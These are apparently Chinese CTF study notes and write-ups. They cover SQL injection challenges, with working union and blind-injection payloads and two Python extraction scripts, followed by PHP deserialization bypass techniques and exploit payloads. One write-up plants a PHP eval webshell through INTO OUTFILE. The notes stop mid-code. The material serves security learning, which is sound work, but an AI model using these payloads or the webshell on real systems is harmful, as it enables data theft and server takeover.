## **SQL 注入题 [NewStar 2024]**
### **谢谢皮蛋**
注入点很明显，测试闭合类型

```sql
1'
1"
#这两个都爆错，数字注入
```

表格两列

```sql
1 order by 2
```

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732543462247-85286679-00e1-441e-9f6e-001f3f7406df.png)

爆数据库和版本

```sql
-1 union select 1,group_concat(database(),version())
```

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732543657736-7ea29beb-216d-4b12-9863-9f8b31959935.png)爆表

```sql
-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema='ctf'
```

 ![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732543793413-8d3ea836-3f87-4ebd-8f1b-7098fc31894e.png)

爆字段

```sql
-1 union select 1,group_concat(column_name) from information_schema.columns where table_name='Fl4g'
```

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732543870321-6e60ad5c-6ff4-476b-acfc-e22fb96ce8c1.png)

爆内容

```sql
-1 union select 1,group_concat(value) from Fl4g
```

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732543977745-197108eb-1ce0-454b-be2c-ed61a03169c9.png)

### blindsql1
字符注入，判断闭合类型

```sql
#有回显
Alice'#
#无回显
Alice"#
#单引号闭合
```

这题一看就是盲注，测试过滤

```sql
空格、=、/、ascii()、substr()
```

如何绕过

```sql
# 1.空格用括号绕过
# 2.=用likeraoguo
# 3.ascii()用ord()绕过
# 4，substr()用mid()绕过
```

> 介绍一下后两个函数
>
> mid（）![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732547547325-576a837b-913b-4eff-9c9e-26ca4ae146a1.png)
>
> ord（）
>
> MySQL中的ORD()函数用于查找字符串中最左边的字符的代码。如果最左边的字符不是多字节字符，则返回ASCII值。并且如果字符串str的最左边的字符是一个多字节字符，那么ORD返回该字符的代码，该代码是使用以下公式根据其组成字节的数值计算得出的：
>
> **(第一字节代码)+(第二字节代码* 256)+(第三字节代码* 256^2)……**
>
> **补充：**
>
> ![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732547654950-958a86ec-2411-4ae2-b2d3-67467e40c99f.png)
>

试一下语句,准备写脚本

```sql
Alice'and(ord(mid((select(group_concat(database()))),1,1))>1)#
```

成功，写脚本，脚本在最后粘出

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732548610662-6a7fb464-6e60-4555-bc36-1d7ce230ff1d.png)

当前库名

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732548875799-da8fb021-6573-4666-8c82-de2afbac3709.png)

爆表名

```sql
Alice'and((((ord(mid((select(group_concat(table_name))from(information_schema.tables)where((table_schema)like(database()))),1,1))))>1))#
```

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732550631590-a2f13a37-0787-462d-9ccb-a964c71b68d5.png)

```sql
Alice'and((((ord(mid((select(group_concat(column_name))from(information_schema.columns)where((table_name)like('secrets'))),1,1))))>1))#
```

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732551265623-7353e2ec-a4ae-4131-b758-5be01f522383.png)

```sql
Alice'and((((ord(mid((Select(group_concat(secret_value))from(secrets)where((secret_value)like('flag%'))),1,1))))>1))#
```

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732552419074-92bbc7b5-30c2-43f4-a953-34ac843a12fe.png)

脚本如下

```sql
import requests
import time

url = "http://127.0.0.1:64146/?"
temp = {"student_name": ""}
column = ""
for i in range(1, 1000):
    time.sleep(0.02)
    low = 32
    high = 128
    mid = (low + high) // 2
    while (low < high):
        # 当前所在库
        # temp["student_name"] = "Alice'and(ord(mid((select(group_concat(database()))),%d,1))>%d)#" % (i , mid)
        # 表名
        # temp["student_name"] = "Alice'and((((ord(mid((select(group_concat(table_name))from(information_schema.tables)where((table_schema)like(database()))),%d,1))))>%d))#" %(i,mid)
        # 字段名
        # temp["student_name"] = "Alice'and((((ord(mid((select(group_concat(column_name))from(information_schema.columns)where((table_name)like('secrets'))),%d,1))))>%d))#" %(i,mid)
        # 内容
        temp["student_name"] = f"Alice'and((((ord(mid((Select(group_concat(secret_value))from(secrets)where((secret_value)like('flag%'))),{i},1))))>{mid}))#"
        r = requests.get(url, params=temp)
        time.sleep(0.04)
        print(low, high, mid, ":")
        if "Alice" in r.text:
            low = mid + 1
        else:
            high = mid
        mid = (low + high) // 2
    if (mid == 32 or mid == 127):
        break
    column += chr(mid)
    print(column)

print("All:", column)
```

### blindsql2
![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732595143240-b195c694-eb3a-4729-9a85-971a994e5322.png)

测闭合

```sql
1‘
# 没回显
1“
# 有回显
1’#
# 有回显
# 综上，单引号闭合
```

测过滤

```sql
空格、/、ascii()、substr()、=、
```

跟上一题差不多，就是时间盲注

爆当前库

```sql
Alice'and(if((ord(mid((select(group_concat(database()))),1,1))>1),sleep(3),1))#
```

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732596075629-4f608b1d-9f51-41ce-9811-c46daf621172.png)

爆表

```sql
Alice'and(if((((ord(mid((select(group_concat(table_name))from(information_schema.tables)where((table_schema)like(database()))),1,1))))>1),sleep(4),1))#
```

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732596773301-ba9c9a6f-6b56-49ba-804c-5fb723ec3a4d.png)

爆字段

```sql
Alice'and(if((((ord(mid((select(group_concat(column_name))from(information_schema.columns)where((table_name)like('secrets'))),1,1))))>1),sleep(2),1))#
```

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732596953917-8ec82a76-d24c-4420-9030-279f17a01bc2.png)

```sql
Alice'and(if(((((ord(mid((select(group_concat(secret_value))from(secrets)where((secret_value)like('flag%'))),1,1))))>1)),sleep(5),1))#
```

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732597170046-16860943-2b24-4d74-9dba-6922586fccda.png)

结束，代码如下



```sql
import time

import requests

url = "http://127.0.0.1:50046/?"
temp = {"student_name": ""}
result = ""
for i in range(1, 1000):
    time.sleep(0.02)
    low = 32
    high = 128
    mid = (low + high) // 2
    while low < high:
        # 当前所在库
        # temp["student_name"] = f"Alice'and(if((ord(mid((select(group_concat(database()))),{i},1))>{mid}),sleep(2),1))#"
        # 表名
        # temp["student_name"] = f"Alice'and(if((((ord(mid((select(group_concat(table_name))from(information_schema.tables)where((table_schema)like(database()))),{i},1))))>{mid}),sleep(2),1))#"
        # 字段名
        # temp["student_name"] = f"Alice'and(if((((ord(mid((select(group_concat(column_name))from(information_schema.columns)where((table_name)like('secrets'))),{i},1))))>{mid}),sleep(2),1))#"
        # 内容
        temp["student_name"] = f"Alice'and(if(((((ord(mid((select(group_concat(secret_value))from(secrets)where((secret_value)like('flag%'))),{i},1))))>{mid})),sleep(5),1))#"
        try:
            print(low, high, mid, ":")
            r = requests.get(url, params=temp, timeout=1)
        except Exception as e:
            low = mid + 1
        else:
            high = mid
        mid = (low + high) // 2
    if mid == 32 or mid == 127:
        break
    result += chr(mid)
    print(result)

print("All:", result)
```

### sqlshell
先测闭合

```sql
Alice'
# 没回显
Alice"
# 有回显
ALice'#
# 有回显
# 综上，单引号闭合
```

测过滤，好像没过滤

测列数

```sql
Alice' order by 3#
# 有回显
Alice' order by 4#
# 没回显
# 综上，表格3列
```

测回显位

```sql
1' union select 1,2,3#
# 都是回显位
```

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732606079086-f486f696-7302-4a77-8463-5f2f4f64a903.png)

在网上找到个函数，看看当前路径，来写木马文件

```sql
1' union select 1,2,group_concat(@@datadir)#

@@datadir  
# 查看数据库路径
```

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732606225897-70137f14-a0cb-4881-b70b-4e94abc7804f.png)

试着写一下木马文件

```sql
1' union select 1,2,'<?php eval($_POST['a']);?>' into outfile '/mysql/data/1.php'#

into outfile()
# 在路径下进行文件写入
```

之后发现不可以，文件没写成功

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732606839398-051e2c3b-6ce4-487d-aacf-2fe1102ffd84.png)

去网上找了文件读写的笔记

参考文章：[【SQL注入16】SQL漏洞利用之读写文件](https://blog.csdn.net/Fighting_hawk/article/details/123020457)

发现用户的权限也有一张表专门记录

即 mysql 库下的 user 表里的 file_priv 字段

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732607606888-88ef8e03-758e-4e80-ad65-168ecc13fbc0.png)

两个关键

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732607691319-325f376d-cfb8-4941-a059-55c7f567c1b9.png)

让我们查一下,得到现在是有权限的

```sql
1' union select 1,2,user()#

user()
# 当前用户名
```

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732608081029-3934e150-5d6e-4ee3-b655-00845a224346.png)

```sql
1' union select 1,2,file_priv from mysql.user where host='localhost' and user='root'#
```

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732608135154-448c1b0b-fa0a-454f-8721-5622e565e642.png)

通过询问，明白了原因。访问网站本质是对服务器下的目录进行访问，而有些目录是不允许被访问，而有些目录是默认被允许访问的，比如 /var/www/html 

```sql
1' union select 1,2,"<?php eval($_POST['a']);?>" into outfile '/var/www/html/1.php'#
```

之后蚁剑链接

```sql
url格式是：
http://127.0.0.1:63920/1.php
```

a

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732613186383-63c9564c-c396-471b-93a0-525e0e2af6b4.png)

## 序列化和反序列化
### 序列化
#### 定义：
有时需要把一个对象在网络上传输，为了方便传输，可以**把整个对象转化为二进制串**，等到达另一端时，再还原为原来的对象，这个过程称之为**串行化**(也叫**序列化**)。

#### 相关函数：
PHP序列化：把对象转化为二进制的**字符串**，使用`serialize()`函数  
PHP反序列化：把对象转化的二进制字符串再转化为**对象**，使用`unserialize()`函数  

#### 举例：
```php
<?php
class User
{
    //类的数据
    public $age = 0;
    public $name = '';
    //输出数据
    public function printdata()
    {
        echo 'User '.$this->name.' is '.$this->age.' years old.<br />';
    } // “.”表示字符串连接
}
//创建一个对象
$usr = new User();
//设置数据
$usr->age = 18;
$usr->name = 'Hardworking666';
//输出数据
$usr->printdata();
//输出序列化后的数据
echo serialize($usr)
?>
```

输出结果

```php
User Hardworking666 is 18 years old.
O:4:"User":2:{s:3:"age";i:18;s:4:"name";s:14:"Hardworking666";}
```

> “O”表示**对象**，“4”表示**对象名长度为4**，“User”为**对象名**，“2”表示**有2个参数**。
>
> “{}”里面是参数的key和value，
>
> “s”表示**string对象**，“3”表示**长度**，“age”则为**key**；“i”是interger（**整数**）对象，“18”是value，后面同理。
>

#### 序列化格式
> public：属性被序列化的时候属性值会变成 `属性名`
>
> protected：属性被序列化的时候属性值会变成 `\x00*\x00属性名`
>
> private：属性被序列化的时候属性值会变成 `\x00类名\x00属性名`
>

```php
a - array 数组型
b - boolean 布尔型
d - double 浮点型
i - integer 整数型
o - common object 共同对象
r - objec reference 对象引用
s - non-escaped binary string 非转义的二进制字符串
S - escaped binary string 转义的二进制字符串
C - custom object 自定义对象
O - class 对象
N - null 空
R - pointer reference 指针引用
U - unicode string Unicode 编码的字符串
```

注意：

1、**序列化只序列属性，不序列方法**  
2、因为序列化不序列方法，所以反序列化之后如果想正常使用这个对象的话我们必须要依托这个类**要在当前作用域存在的条件**  
3、我们能控制的只有类的属性，攻击就是寻找合适**能被控制的属性**，利用作用域本身存在的方法，基于属性发动攻击

## 反序列化：
举例：

```php
<?php
class User
{
    //类的数据
    public $age = 0;
    public $name = '';
    //输出数据
    public function printdata()
    {
        echo 'User '.$this->name.' is '.$this->age.' years old.<br />';
    }
}
//重建对象
$usr = unserialize('O:4:"User":2:{s:3:"age";i:18;s:4:"name";s:14:"Hardworking666";}');
//输出数据
$usr->printdata();
?>
```

输出

```php
User Hardworking666 is 18 years old.
```

PHP为何要序列化和反序列化：

PHP的序列化与反序列化其实是为了解决一个问题：**PHP对象传递问题**

PHP对象是存放在**内存的堆空间段**上的，PHP文件在**执行结束的时候会将对象销毁**。

如果刚好要用到销毁的对象，难道还要再写一遍代码？所以为了解决这个问题就有了PHP的序列化和反序列化

从上文可以发现，我们可以**把一个实例化的对象长久的存储在计算机磁盘**上，需要调用的时候只需反序列化出来即可使用。

PHP反序列化漏洞原理

序列化和反序列化本身没有问题，

但是**反序列化内容用户可控**，

且**后台不正当的使用了PHP中的魔法函数**，就会导致安全问题。

当传给`unserialize()`的**参数可控**时，可以通过传入一个精心构造的序列化字符串，从而控制对象内部的变量甚至是函数。

## 16 个魔术方法
```php
__construct()，类的构造函数

__destruct()，类的析构函数

__call()，在对象中调用一个不可访问方法时调用

__callStatic()，用静态方式中调用一个不可访问方法时调用

__get()，获得一个类的成员变量时调用

__set()，设置一个类的成员变量时调用

__isset()，当对不可访问属性调用isset()或empty()时调用

__unset()，当对不可访问属性调用unset()时被调用。

__sleep()，执行serialize()时，先会调用这个函数

__wakeup()，执行unserialize()时，先会调用这个函数

__toString()，类被当成字符串时的回应方法

__invoke()，调用函数的方式调用一个对象时的回应方法

__set_state()，调用var_export()导出类时，此静态方法会被调用。

__clone()，当对象复制完成时调用

__autoload()，尝试加载未定义的类

__debugInfo()，打印所需调试信息
```

### 触发条件
####  __construct() ：
 当对象创建时会自动调用(但在unserialize()时是不会自动调用的)。  

####  __destruct()：
 当对象被销毁时会自动调用。

####  __sleep()：
serialize()时自动调用

####  __wakeup() ：
 unserialize()时会自动调用

####  __toString():  
 当反序列化后的对象被输出在模板中的时候（转换成字符串的时候）自动调用  

> (1)echo ($obj) / print($obj) 打印时会触发
>
> 
>
> (2)反序列化对象与字符串连接时
>
> 
>
> (3)反序列化对象参与格式化字符串时
>
> 
>
> (4)反序列化对象与字符串进行==比较时（PHP进行==比较的时候会转换参数类型）
>
> 
>
> (5)反序列化对象参与格式化SQL语句，绑定参数时
>
> 
>
> (6)反序列化对象在经过php字符串函数，如 strlen()、addslashes()时
>
> 
>
> (7)在in_array()方法中，第一个参数是反序列化对象，第二个参数的数组中有toString返回的字符串的时候toString会被调用
>
> 
>
> (8)反序列化的对象作为 class_exists() 的参数的时候
>

####  __get() :  
 当从不可访问或不存在的属性读取数据  

#### __set():
当为不可访问或者不存在的属性赋值时

####  __call():  
 在对象上下文中调用不可访问或不存在的方法时触发

#### __invoke()：  
当对象被当作函数调用时自动调用

## pop 链构造题
### 含义:
`POP链`就是利用魔法方法在里面进行多次跳转然后获取敏感数据的一种`payload`，实战应用范围暂时没遇到，不过在`CTF`比赛中经常出现这样的题目，同时也经常与[反序列化](https://so.csdn.net/so/search?q=%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96&spm=1001.2101.3001.7020)一起考察，可以理解为是反序列化的一种拓展，泛用性更强，涉及到的魔法方法也更多。  



## 字符串逃逸
参考文章:[PHP反序列化 — 字符逃逸](https://xz.aliyun.com/t/9213?time__1311=n4%2BxnD0DuAG%3DoxGqGNnmDUrxmo8%2B%3DDge%2B77CoD)

### 定义:
 PHP 反序列化漏洞中的字符串逃逸（String Escape）主要涉及在恶意输入的反序列化数据中操纵字符串，导致预期之外的行为。反序列化是将存储或传输的序列化数据转换回原始数据的过程。当反序列化未被安全处理时，攻击者可以利用漏洞注入恶意数据，使得代码执行或操作数据结构变得不可预测。  

### 反序列化的特点:
1.PHP在反序列化时，底层代码是以 ; 作为字段的分隔，以 } 作为结尾(字符串除外)，并且是根据长度判断内容的，同时反序列化的过程中必须严格按照序列化规则才能成功实现反序列化 。例如下图超出的abcd部分并不会被反序列化成功

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732848822707-72820f48-7e05-41d3-9aca-826262719c4b.png)

2. 当序列化的长度不对应的时候会出现报错  

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732848899692-c2b4a289-6e6c-43c3-a163-d5f5404f2e14.png)

3. 可以反序列化类中不存在的元素  

```php
 <?php
class user{
public $name = 'purplet';
public $age = '20';
}
$b='O:4:"user":3:{s:4:"name";s:7:"purplet";s:3:"age";s:2:"20";s:6:"gender";s:3:"boy";}';
print_r(unserialize($b));
?>  
```

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732850743255-e167655d-2e0f-4d32-b81c-0019b67e58d9.png)

### 字符增多型
```php
<?php
function filter($string){
    $filter = '/p/i';
    return preg_replace($filter,'WW',$string);
}
$username = 'purplet';
$age = "10";
$user = array($username, $age);
var_dump(serialize($user));
echo "<pre>";
$r = filter(serialize($user));
var_dump($r);
var_dump(unserialize($r));
?>
```

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732850804486-53210083-3567-4c6c-af72-c11526da3c99.png)

 构造修改age的值的代码：";i:1;s:2:"20";} ，再计算一下构造的代码长度为16，同时知晓Demo的过滤是每有一个p就会多出一个字符，那么此时就再需要输入16个p，与上面构造的代码：";i:1;s:2:"20";} 拼接，即：username的值此时传入的是: pppppppppppppppp";i:1;s:2:"20";}，这样序列化对应的32位长度在过滤后的序列化时会被32个w全部填充，从而使我们构造的代码 ";i:1;s:2:"20";} 成功逃逸，修改了age的值。（后面的值忽略是特点1）  

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732851893240-7812667e-0e5c-49e7-bb54-78f9252b9822.png)

 判断每个字符过滤后会比原字符多出几个。如果多出一个就与上述相同，如果多出两个。则可以理解上面的Demo中的p过滤后会变成3个W，我们构造的代码长度依然是16，那么逃逸也就只需要再构造16/2=8个p即可（即：构造代码的长度除以多出的字符数)

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732851966937-97966a63-24cf-4924-8643-5715101406e6.png)

### 字符减少型
```plain
<?php
function filter($string){
    $filter = '/pp/i';
    return preg_replace($filter,'W',$string);
}
$username = 'ppurlet';
$age = '10';
$user = array($username, $age);
var_dump(serialize($user));
echo "<pre>";
$r = filter(serialize($user));
var_dump($r);
var_dump(unserialize($r));
?>
```

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732852286298-52deea43-116e-402b-8707-1216e1352829.png)

再看这个Demo，很明显两个p变成了一个W，但是前面的长度依然是7，因为过滤后的字符长度变小了，所以该7位数值将向后吞噬了第一个“到;结束，所以这种问题就不再是只传递一个值，而应该在username处传递构造的过滤字符，age处传递逃逸代码。  

#### 构造步骤
1. 利用Demo中的代码将age的值修改为想要修改的数值，即:20，得到age处序列化的值为;i:1;s:2:"20";}，那么把这段数值再次传入Demo代码的age处（该值即为最终的逃逸代码），而此时username传递的p的数值无法确定，先可随意构造，查看结果 

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732852979053-a74dfaf1-70b5-41d8-94ca-39e90650f8f2.png)

2. age处传递一个任意数值和双引号进行闭合，即：再次传入age = A";i:1;s:2:"20";}，查看结果  

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732853001705-b2bcad3d-b582-4e48-8ebd-d865bbfe8a0a.png)

3. 计算选中部分（长度为13）根据过滤后字符缩减情况构造，Demo中每两个p变为1个W，相当于逃逸1位（选中部分即为逃逸字符）所以输入13*2=26个p进行逃逸，即最终传递 usernmae=pppppppppppppppppppppppppp，age=A";i:1;s:2:"20";}  

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732853033769-3f3a28b6-dfba-4900-92fe-ec949a808fb8.png)

#### 总结:
##### 原理:
字符增多型逃逸的原理是通过字符增多把输入的字符串里的可以自成属性的部分挤出原来的属性,使之自称一个属性,这个自成属性的字符串要有 } ,使这个反序列化提前闭合.

字符减少型逃逸的原理是通过字符减少把原来的属性字符串并进减少的部分,是这部分属性字符串失效,再传入这个属性的序列化字符串,从而修改变量值

#### 方法:
字符增多型先寻找要修改的属性,把这个属性写进会增长的值里面,计算长度,应该按 `";i:1;s:2:"20";}` (第一个双引号是为了属性在增长前闭合,最后一个大括号是为了在增长后使整个字符串提前闭合)这种格式,从双引号开始,以大括号结尾

字符增多型计算长度,应该先选择要吞入的字符串,然后计算长度,最后再传入要修改的参数.

## 常见绕过
### <font style="color:#000000;">绕过 __wakeup()方法：</font>
参考文章：[PHP反序列化中wakeup()绕过总结](https://fushuling.com/index.php/2023/03/11/php%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e4%b8%adwakeup%e7%bb%95%e8%bf%87%e6%80%bb%e7%bb%93/)

存在此漏洞的php版本：php5-php5.6.25、php7-php7.0.10；

当不需要 __wakeup()触发时

#### 方法一：序列化字符串中所写的属性值的个数大于实际个数
 比如攻防世界·unserialize3：

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732970279585-493d88a1-5c85-4854-ba26-d0fa5360335f.png)

可以看到源码里有__wakeup()，它会在我们反序列化之前就exit()，终止我们反序列化的进程

如果我们的payload是

```plain
<?php
class xctf{
public $flag = '111';
public function __wakeup(){
 
}
}
$a = new xctf();
print(serialize($a));
#O:4:"xctf":1:{s:4:"flag";s:3:"111";} 
?>
```

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732970347310-e08d4d03-35d7-4d79-be0e-a893497fc610.png)

毫无疑问的被exit(‘bad requets’)终止了。

但这个题的考点就是cve-2016-7124，所以我们可以利用cve-2016-7124进行绕过，将payload里ctf后面那个1改为2就行了，因为真实的属性其实只有一个，那就是那个flag，改为2之后对象属性个数的值就大于真实的属性个数了，因此可以绕过wakeup()，现在的payload是：

```plain
O:4:"xctf":2:{s:4:"flag";s:3:"111";}
```

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732970396857-c95144b3-ee5a-4356-add5-2d5820c54c9e.png)

 成功得到flag，不过符合这种要求的php版本都比较老了，感觉实战中很难出现。  

#### 方法二： php引用赋值&，两个变量指向同一个地址
 在php里，我们可使用引用的方式让两个变量同时指向同一个内存地址，这样对其中一个变量操作时，另一个变量的值也会随之改变。

 比如：

```plain
<?php
function test (&$a){
    $x=&$a;
    $x='123';
}
$a='11';
test($a);
echo $a;
```

 输出:  

```plain
123
```

 可以看到这里我们虽然最初$a= '11' ，但由于我们通过$x=&$a使两个变量同时指向同一个内存地址了，所以使$x= '123' 也导致$a= '123' 了。

 举个例子： 

```plain
<?php

class KeyPort{
    public $key;

    public function __destruct()
    {
        $this->key=False;
        if(!isset($this->wakeup)||!$this->wakeup){
            echo "You get it!";
        }
    }

    public function __wakeup(){
        $this->wakeup=True;
    }

}

if(isset($_POST['pop'])){

    @unserialize($_POST['pop']);

}
```

可以看到如果我们想触发echo必须首先满足:

```plain
if(!isset($this->wakeup)||!$this->wakeup)
```

也就是说要么不给wakeup赋值，让它接受不到$this->wakeup，要么控制wakeup为false，但我们注意到KeyPort::__wakeup()，这里使$this->wakeup=True;，我们知道在用unserialize()反序列化字符串时，会先触发__wakeup()，然后再进行反序列化，所以相当于我们刚进行反序列化$this->wakeup就等于True了，这就没办法达到我们控制wake为false的想法了

因此这里的难点其实就是这个wakeup()绕过，我们可以使用上面提到过的引用赋值的方法以此将wakeup和key的值进行引用，让key的值改变的时候也改变wakeup的值即可

```plain
<?php

class KeyPort{
    public $key;

    public function __destruct()
    {
    }

}

$keyport = new KeyPort();
$keyport->key=&$keyport->wakeup;
echo serialize($keyport); 
#O:7:"KeyPort":2:{s:3:"key";N;s:6:"wakeup";R:2;}
```

![](https://cdn.nlark.com/yuque/0/2024/jpeg/49936693/1732970862034-fbe07309-fbc5-4853-9339-2eeeb19f970f.jpeg)

### 绕过正则
如preg_match('/^O:\d+/')匹配序列化字符串是否是对象字符串开头。

绕过方法

+ 利用加号绕过（注意在url里传参时+要编码为%2B）。
+ 利用数组对象绕过，如 serialize(array($a)); a为要反序列化的对象(序列化结果开头是a，不影响作为数组元素的$a的析构)。

```php
<?php
class test{
    public $a;
    public function __construct(){
        $this->a = 'abc';
    }
    public function  __destruct(){
        echo $this->a.PHP_EOL;
    }
}
 
function match($data){
    if (preg_match('/^O:\d+/',$data)){
        die('nonono!');
    }else{
        return $data;
    }
}
$a = 'O:4:"test":1:{s:1:"a";s:3:"abc";}';
// +号绕过
$b = str_replace('O:4','O:+4', $a);
unserialize(match($b));
// 将对象放入数组绕过 serialize(array($a));
unserialize('a:1:{i:0;O:4:"test":1:{s:1:"a";s:3:"abc";}}');
```

### 利用引用绕过
如下，要求输出 you success，但构造的序列化字符串中不能由 aaa

```php
<?php
class test {
    public $a;
    public $b;
    public function __construct(){
        $this->a = 'aaa';
    }
    public function __destruct(){
 
        if($this->a === $this->b) {
            echo 'you success';
        }
    }
}
if(isset($_REQUEST['input'])) {
    if(preg_match('/aaa/', $_REQUEST['input'])) {
       die('nonono');
    }
    unserialize($_REQUEST['input']);
}else {
    highlight_file(__FILE__);
}
```

### 可以利用引用进行绕过
```php
class test {
    public $a;
    public $b;
    public function __construct(){
        $this->b = &$this->a;
    }
}
$a = serialize(new test());
echo $a;
//O:4:"test":2:{s:1:"a";N;s:1:"b";R:2;}
```

 构造引用使得 $b 和 $a 地址相同从而绕过检测，达成要求。 

### 16进制绕过字符的过滤
序列字符串中表示字符类型的s大写时，会被当成16进制解析。

举个栗子：

```php
<?php
class test{
    public $username;
    public function __construct(){
        $this->username = 'admin';
    }
    public function  __destruct(){
        echo 'success';
    }
}
function check($data){
    if(preg_match('/username/', $data)){
        echo("nonono!!!</br>");
    }
    else{
        return $data;
    }
}
// 未作处理前，会被waf拦截
$a = 'O:4:"test":1:{s:8:"username";s:5:"admin";}';
$a = check($a);
unserialize($a);
// 将小s改为大S; 做处理后 \75是u的16进制， 成功绕过
$a = 'O:4:"test":1:{S:8:"\\75sername";s:5:"admin";}';
$a = check($a);
unserialize($a);
```

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732971550012-e39f8bf4-1963-4b97-9693-39d43d4e4a71.png)

### 生成phar
**phar反序列化**

有关phar的基本介绍及利用方法

同时应该重点关注[官方文档](https://www.php.net/manual/zh/book.phar.php)中有关 phar 的介绍 (一定要关注官方文档，官方文档yyds)

```php
<?php
class TestObject {
}
 
@unlink("phar.phar");
$phar = new Phar("phar.phar"); //后缀名必须为phar
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置stub
$o = new TestObject();
$phar->setMetadata($o); //将自定义的meta-data存入manifest
$phar->addFromString("test.txt", "test"); //添加要压缩的文件
//签名自动计算
$phar->stopBuffering();
```

 ps：注意phar中存储的对象反序列化之后会被phar对象的metadata属性引用。  

## [极客大挑战 2019]PHP1
网站备份,扫目录,找备份文件

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732778237428-23182b6b-8f13-48b0-9d65-b94dd15b418c.png)

扫出来了



下载文件

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732778818135-f92f3d78-68b8-4c79-9d8a-b1edadf4c0b8.png)

有用的也就 class.php 一个

```php
<?php
include 'flag.php';


error_reporting(0);


class Name{
    private $username = 'nonono';
    private $password = 'yesyes';

    public function __construct($username,$password){
        $this->username = $username;
        $this->password = $password;
    }

    function __wakeup(){
        $this->username = 'guest';
    }

    function __destruct(){
        if ($this->password != 100) {
            echo "</br>NO!!!hacker!!!</br>";
            echo "You name is: ";
            echo $this->username;echo "</br>";
            echo "You password is: ";
            echo $this->password;echo "</br>";
            die();
        }
        if ($this->username === 'admin') {
            global $flag;
            echo $flag;
        }else{
            echo "</br>hello my friend~~</br>sorry i can't give you the flag!";
            die();

            
        }
    }
}
?>
```

还有 index.php 的这一段

```php
<?php
    include 'class.php';
    $select = $_GET['select'];
    $res=unserialize(@$select);
?>
```

目标明确一下

使 password=100,username=admin

但是有 __wakeup() 会重新为 username 赋值,所以要绕过 __wakeup()

>  绕过方法:
>
> + 属性个数不匹配
> + 两个变量指向同一个地址
>
> 但是这里只有两个变量,而且他们的值都被规定了,所以选第二个方法
>

写 exp

```php
<?php

class Name
{
    private $username = 'nonono';
    private $password = 'yesyes';

    public function __construct($username, $password)
    {
        $this->username = $username;
        $this->password = $password;
    }
}

$a = new Name('admin', '100');
echo serialize($a);
```

把输出的第一个 Name 后面的 2 改成比 2 大的数字就可以,然后把变量名前后的空格换成%00

```php
O:4:"Name":3:{s:14:"%00Name%00username";s:5:"admin";s:14:"%00Name%00password";s:3:"100";}
```

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732780679249-f58acb92-ac8d-41ff-966e-0c8618a98cf6.png)

## Web_php_unserialize[ 攻防世界 ]
```php
 <?php 
class Demo { 
    private $file = 'index.php';
    public function __construct($file) { 
        $this->file = $file; 
    }
    function __destruct() { 
        echo @highlight_file($this->file, true); 
    }
    function __wakeup() { 
        if ($this->file != 'index.php') { 
            //the secret is in the fl4g.php
            $this->file = 'index.php'; 
        } 
    } 
}
if (isset($_GET['var'])) { 
    $var = base64_decode($_GET['var']); 
    if (preg_match('/[oc]:\d+:/i', $var)) { 
        die('stop hacking!'); 
    } else {
        @unserialize($var); 
    } 
} else { 
    highlight_file("index.php"); 
} 
?>
```

解题条件：

> 1 .要绕过wake up 
>
> 2 .要绕过正则表达式
>
> 3 .必须是base64加密
>

exp

```php
<?php 
class Demo { 
    private $file = 'index.php';
    public function __construct($file) { 
        $this->file = $file; 
    }
    function __destruct() { 
        echo @highlight_file($this->file, true); 
    }
    function __wakeup() { 
        if ($this->file != 'index.php') { 
            //the secret is in the fl4g.php
            $this->file = 'index.php'; 
        } 
    } 
}
$A = new Demo ('fl4g.php');					//创建对象
$C = serialize($A);                     //对对象A进行序列化
$C = str_replace('O:4','O:+4',$C);      //绕过正则表达式过滤
$C = str_replace(':1:',':2:',$C); 		//wakeup绕过
var_dump($C);
var_dump(base64_encode($C));            //base64加密

?>
```

```php
TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==
```

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732844439504-06ef612c-88df-4bd3-a46a-d70cc3d00c02.png)

## pop base mini moe
```php
<?php

class A {
    // 注意 private 属性的序列化哦
    private $evil;

    // 如何赋值呢
